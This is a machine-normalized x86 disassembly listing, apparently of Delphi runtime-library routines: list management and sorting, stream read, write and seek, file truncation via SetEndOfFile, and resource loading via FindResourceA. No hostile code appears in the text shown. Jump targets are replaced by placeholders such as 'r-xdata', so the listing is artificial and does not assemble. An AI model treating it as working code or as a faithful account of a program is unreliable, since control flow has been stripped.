push ebp
push sub_41a422
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ef10
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41ef18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a429
lea eax [ ebp - 0xc ]
call sub_403eec
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420674
inc esi
dec ebx
jne r-xdata
sub_41a454
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a470
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4195d4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404968
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_41a4d8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419950
jmp r-xdata
sub_41a574
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404968
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a5b4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419950
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404a54
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41a620
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419950
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_419950
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a67c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a67c
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41a6a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41a718
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419950
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403f40
pop edi
pop esi
pop ebx
retn
sub_41a754
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419950
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41a77c
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41a7b0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_419ca4
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41a7fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419950
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419950
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a850
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41a77c
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403f40
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028f0
sub_41a8c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419950
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419950
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f40
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a924
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419950
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a964
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a67c
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a964
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41aa14
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41aa70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41a964
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41aac4
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41aaf8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41ab5c
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41abb0
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030c4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
mov esp ebp
pop ebp
retn
sub_41abfc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4030bc
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41abb0
pop ecx
mov eax [ ebx ]
call sub_403100
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41abb0
pop ecx
sub_41ac80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41acf0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
sub_41ad28
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
sub_41ad60
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41aae4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026f4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41ae3c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ae43
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402714
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41acf0
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41ad28
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41ae54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b528
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41aea4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41d55c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aeab
mov eax [ ebp - 0x8 ]
call sub_403174
retn
sub_41aeb4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_41af10
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4083e0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41af50
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cb2c
pop ebx
pop ebp
retn 0x8
sub_41af78
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41afbc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_41afbc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41b0e5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4034c0
movzx edx di
mov eax esi
call sub_408304
mov ecx eax
xor edx edx
mov eax ebx
call sub_41aeb4
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408380
mov ecx eax
xor edx edx
mov eax ebx
call sub_41aeb4
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b0ec
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f10
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4084d8
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40af04
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4084d8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40af04
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
jmp r-xdata
sub_41b0ec
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_41b110
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
call sub_408418
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_41b14c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028f0
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41b184
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41b1a8
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_41b1d4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_41b1ec
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41aae4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41acf0
sub_41b224
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41b144
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41b24c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41b224
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b278
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406a7c
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406a60
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406a50
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
test ecx ecx
jne r-xdata
sub_41b304
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028f0
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41b224
sub_41b354
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4043ac
mov ecx eax
mov edx esi
mov eax edi
call sub_41b46c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_41b3ac
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx esi
mov eax edi
call sub_41b46c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_41b3fc
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b45f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b466
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_41b46c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
